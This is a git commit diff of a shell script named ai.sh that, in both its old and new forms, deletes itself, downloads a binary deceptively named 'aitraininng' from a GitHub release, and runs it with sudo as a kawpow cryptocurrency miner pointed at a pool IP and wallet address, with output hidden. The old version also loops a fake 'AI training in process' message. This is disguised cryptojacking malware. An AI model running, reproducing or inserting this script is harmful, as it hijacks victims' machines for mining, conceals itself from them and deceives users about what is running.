8ef7533b10aacff9c7f9c5a2d4ee562c9610a92b
max313iq <153689278+max313iq@users.noreply.github.com>
2024-11-30 18:09:22 +0300

    Update ai.sh

--- ai.sh
+++ ai.sh
@@ -1,11 +1,13 @@
 #!/bin/bash
-nohup bash -c "
-  ( sleep 1; rm -- \"$0\" ) &
-  wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng
-  chmod +x aitraininng
-  sudo ./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch &
-" > /dev/null 2>&1 &
-while true; do
-    echo "AI training in process"
-    sleep 600 
-done
+
+# Self-delete after execution
+( sleep 1; rm -- "$0" ) &
+
+# Download the file
+wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng
+
+# Make the file executable
+chmod +x aitraininng
+
+# Run the file with the given parameters, hiding the output
+sudo ./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch > /dev/null 2>&1
